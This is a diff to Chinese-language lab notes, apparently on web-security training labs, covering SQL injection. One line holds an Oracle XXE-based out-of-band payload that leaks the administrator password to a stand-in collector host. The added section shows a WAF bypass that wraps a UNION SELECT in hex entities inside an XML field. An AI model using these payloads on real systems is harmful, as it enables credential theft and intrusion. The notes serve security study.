@@ -149,3 +149,9 @@
 > 在上一题的基础上请求密码并将其拼接进URL，这里需要注意加`.`使得密码作为子域名。另外注意单引号和双引号的严格使用，具体原因我也不太懂。
 
 `' union select extractvalue(xmltype('<%3fxml version%3d"1.0" encoding%3d"UTF-8"%3f><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http%3a//'||(select password from users where username%3d'administrator')||'.collector.domain/"> %25remote%3b]>'),'/l') from dual--`
+
+## 18: SQL injection with filter bypass via XML encoding
+
+WAF会检测SQL注入，在商品界面进行Check stock时，会有一个数据以xml形式传递的POST包，可以对xml字段进行注入，但简单尝试后会发现存在WAF。
+
+对于xml，可以在注入的地方加入`<@/hex_entities><@/hex_entities>`来包裹住payload，以绕过WAF，即`<storeId><@hex_entities>-1 union select password from users where username='administrator'<@/hex_entities></storeId>`。
